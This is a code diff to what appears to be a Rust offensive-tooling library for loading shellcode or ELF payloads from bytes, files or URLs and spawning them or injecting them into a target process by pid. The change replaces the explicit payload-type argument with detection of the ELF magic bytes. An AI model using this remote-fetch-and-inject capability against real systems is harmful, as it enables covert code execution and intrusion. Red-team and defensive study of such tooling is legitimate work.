@@ -123,7 +123,12 @@ impl Payload<Spawn> {
     /// let shellcode = vec![0x90, 0x90, 0x90];  // NOP sled
     /// let payload = Payload::<Spawn>::from_bytes(shellcode, PayloadType::Shellcode).unwrap();
     /// ```
-    pub fn from_bytes(bytes: Vec<u8>, payload_type: PayloadType) -> Result<Self> {
+    pub fn from_bytes(bytes: Vec<u8>) -> Result<Self> {
+        let payload_type = match bytes[..4] {
+            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
+            _ => PayloadType::Shellcode,
+        };
+
         Ok(Self {
             payload_type,
             bytes,
@@ -162,12 +167,18 @@ impl Payload<Spawn> {
     /// // Load an Inject ELF executable
     /// let payload = Payload::<Spawn>::from_file("/usr/bin/ls", PayloadType::Executable).unwrap();
     /// ```
-    pub fn from_file(path: impl Into<String>, payload_type: PayloadType) -> Result<Self> {
+    pub fn from_file(path: impl Into<String>) -> Result<Self> {
         let path = path.into();
+
+        let bytes = fs::read(&path)?;
+        let payload_type = match bytes[..4] {
+            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
+            _ => PayloadType::Shellcode,
+        };
 
         Ok(Self {
             payload_type,
-            bytes: fs::read(&path)?,
+            bytes,
             state: Spawn {
                 name: path.split('/').last().unwrap_or("").to_string(),
                 args: String::new(),
@@ -211,17 +222,22 @@ impl Payload<Spawn> {
     ///     PayloadType::Shellcode
     /// ).unwrap();
     /// ```
-    pub fn from_url(url: impl Into<String>, payload_type: PayloadType) -> Result<Self> {
+    pub fn from_url(url: impl Into<String>) -> Result<Self> {
         let url = url.into();
 
         let response = ureq::get(&url).call()?;
 
-        let mut payload_bytes: Vec<u8> = Vec::new();
-        response.into_reader().read_to_end(&mut payload_bytes)?;
+        let mut bytes: Vec<u8> = Vec::new();
+        response.into_reader().read_to_end(&mut bytes)?;
+
+        let payload_type = match bytes[..4] {
+            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
+            _ => PayloadType::Shellcode,
+        };
 
         Ok(Self {
             payload_type,
-            bytes: payload_bytes,
+            bytes,
             state: Spawn {
                 name: url.split('/').last().unwrap_or("").to_string(),
                 args: String::new(),
@@ -252,7 +268,12 @@ impl Payload<Inject> {
     ///     1234
     /// ).unwrap();
     /// ```
-    pub fn from_bytes(bytes: Vec<u8>, payload_type: PayloadType, pid: i32) -> Result<Self> {
+    pub fn from_bytes(bytes: Vec<u8>, pid: i32) -> Result<Self> {
+        let payload_type = match bytes[..4] {
+            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
+            _ => PayloadType::Shellcode,
+        };
+
         Ok(Self {
             payload_type,
             bytes,
@@ -289,12 +310,18 @@ impl Payload<Inject> {
     ///     1234
     /// ).unwrap();
     /// ```
-    pub fn from_file(path: impl Into<String>, payload_type: PayloadType, pid: i32) -> Result<Self> {
+    pub fn from_file(path: impl Into<String>, pid: i32) -> Result<Self> {
         let path = path.into();
+
+        let bytes = fs::read(&path)?;
+        let payload_type = match bytes[..4] {
+            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
+            _ => PayloadType::Shellcode,
+        };
 
         Ok(Self {
             payload_type,
-            bytes: fs::read(&path)?,
+            bytes,
             state: Inject {
                 pid: Pid::from_raw(pid),
             },
@@ -330,17 +357,22 @@ impl Payload<Inject> {
     /// ).unwrap();
     /// ```
     #[cfg(feature = "http")]
-    pub fn from_url(url: impl Into<String>, payload_type: PayloadType, pid: i32) -> Result<Self> {
+    pub fn from_url(url: impl Into<String>, pid: i32) -> Result<Self> {
         let url = url.into();
 
         let response = ureq::get(&url).call()?;
 
-        let mut payload_bytes: Vec<u8> = Vec::new();
-        response.into_reader().read_to_end(&mut payload_bytes)?;
+        let mut bytes: Vec<u8> = Vec::new();
+        response.into_reader().read_to_end(&mut bytes)?;
+
+        let payload_type = match bytes[..4] {
+            [0x7f, b'E', b'L', b'F'] => PayloadType::Executable,
+            _ => PayloadType::Shellcode,
+        };
 
         Ok(Self {
             payload_type,
-            bytes: payload_bytes,
+            bytes,
             state: Inject {
                 pid: Pid::from_raw(pid),
             },
